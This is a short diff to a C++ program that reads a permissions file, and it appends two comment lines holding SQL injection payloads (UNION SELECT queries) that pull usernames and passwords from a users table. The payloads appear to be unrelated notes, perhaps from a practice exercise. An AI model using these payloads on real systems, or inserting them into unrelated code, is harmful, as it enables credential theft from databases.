@@ -64,7 +64,6 @@ bool recursion(string &text, int index)
         }
         return false;
 }
-
 int main()
 {
         string text = readFileToString("permissions.txt");
@@ -76,3 +75,7 @@ int main()
         
         return 0;
 }
+
+
+// ' or 1=1  UNION SELECT username,password,NULL,NULL from users -- 
+// Rajesh'  UNION SELECT CONCAT(username," ",password),CONCAT(username," ",password),NULL,NULL from users -- 
